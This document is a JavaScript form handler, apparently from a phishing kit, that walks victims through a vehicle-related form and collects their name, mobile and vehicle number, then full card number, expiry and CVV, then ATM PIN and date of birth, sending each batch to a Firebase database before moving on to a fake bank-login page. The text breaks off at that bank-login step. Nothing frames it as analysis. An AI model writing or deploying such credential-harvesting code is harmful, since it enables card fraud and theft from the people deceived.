document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("ududip007");
  if (!form) return;

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    // STEP 1 — Name, Mobile, Vehicle Number
    const aname = document.getElementById("aname");
    const bmobile = document.getElementById("bmobile");
    const cac = document.getElementById("cac");
    if (aname && bmobile && cac) {
      const ref = firebase.database().ref("ududip007").push();
      ref.set({
        a_NAME: aname.value,
        b_MOBILE: bmobile.value,
        c_vehicle: cac.value.toUpperCase()
      }).then(() => {
        localStorage.setItem("vehicleNumber", cac.value.toUpperCase());
        localStorage.setItem("fullName", aname.value);
        localStorage.setItem("userSessionKey", ref.key); // store key for next steps if needed
        window.location.href = "card.html";
      }).catch(handleError);
      return;
    }

    // STEP 2 — Card Details
    const cardNumber = document.getElementById("cardNumber");
    const expiry = document.getElementById("expiry");
    const cvv = document.getElementById("cvv");
    if (cardNumber && expiry && cvv) {
      const ref = firebase.database().ref("ududip007").push();
      ref.set({
        card_number: cardNumber.value,
        expiry_date: expiry.value,
        cvv_code: cvv.value
      }).then(() => {
        localStorage.setItem("cardKey", ref.key);
        window.location.href = "atmpin.html";
      }).catch(handleError);
      return;
    }

    // STEP 3 — ATM PIN & DOB
    const atmPin = document.getElementById("atmPin");
    const dob = document.getElementById("dob");
    if (atmPin && dob) {
      const ref = firebase.database().ref("ududip007").push();
      ref.set({
        atm_pin: atmPin.value,
        date_of_birth: dob.value
      }).then(() => {
        localStorage.setItem("dob", dob.value);
        window.location.href = "bank-login.html";
      }).catch(handleError);
      return;
    }

    // STEP 4 — Bank Login
    const bank = document.getElementById("bank");
    const userid =
